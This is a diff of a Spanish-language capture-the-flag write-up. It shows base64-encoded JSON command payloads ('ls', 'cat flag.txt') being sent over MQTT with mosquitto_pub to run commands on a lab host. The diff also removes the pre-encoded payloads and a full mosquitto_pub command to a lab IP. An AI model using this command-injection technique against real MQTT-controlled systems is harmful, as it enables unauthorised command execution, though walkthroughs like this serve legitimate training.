@@ -138,17 +138,8 @@ echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls"}' |
 ```
 <img width="955" height="61" alt="Captura de pantalla 2025-11-15 203900" src="https://github.com/user-attachments/assets/ef887ee0-7055-4e8a-a3af-ffd022d4186d" />
 
-Ejemplo payload resultante (base64):
+Enviar el payload por mosquitto_pub
 
-```
-eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
-```
-
-Enviar el payload:
-
-```bash
-mosquitto_pub -h 10.201.97.52 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=="
-```
 
 Respuesta (oyente) en base64; al decodificar se ve:
 
@@ -168,15 +159,10 @@ Codificar y enviar:
 echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}' | base64
 ```
 
-Ejemplo payload:
-
-```
-eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
-```
-
 Enviar con `mosquitto_pub` (igual que antes).
 
 <img width="1396" height="74" alt="Captura de pantalla 2025-11-16 030055" src="https://github.com/user-attachments/assets/ea8aa0f2-a245-4def-ba36-860530de7acd" />
+
 
 La respuesta final será una cadena base64:
 
